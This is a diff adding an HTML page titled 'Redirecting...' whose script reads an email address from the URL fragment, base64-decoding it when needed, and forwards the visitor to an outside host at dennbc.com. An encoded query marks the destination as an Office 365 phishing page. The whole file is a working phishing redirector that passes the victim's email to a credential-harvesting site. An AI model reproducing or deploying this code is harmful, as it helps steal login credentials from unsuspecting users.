@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    function isBase64(str) {
+      try {
+        const decoded = atob(str);
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded);
+      } catch (e) {
+        return false;
+      }
+    }
+
+    window.onload = function () {
+      let hash = decodeURIComponent(window.location.hash.substring(1)).trim();
+
+      if (!hash) return;
+
+      if (isBase64(hash)) {
+        try {
+          hash = atob(hash);
+        } catch (e) {
+          return; // Invalid base64
+        }
+      }
+
+      // Avoid encoding the email so @ stays intact
+      const newUrl = "https://dennbc.com/s/index.php?c3Y9bzM2NV8xX3NwJnJhbmQ9bEVlVzMmdWlkPVVTRVIyOTA0MjAyNVUzODA0Mjk0MyZyYW5kPUhEM1E3N0123N/#" + hash;
+      window.location.href = newUrl;
+    };
+  </script>
+</head>
+<body>
+  <p></p>
+</body>
+</html>
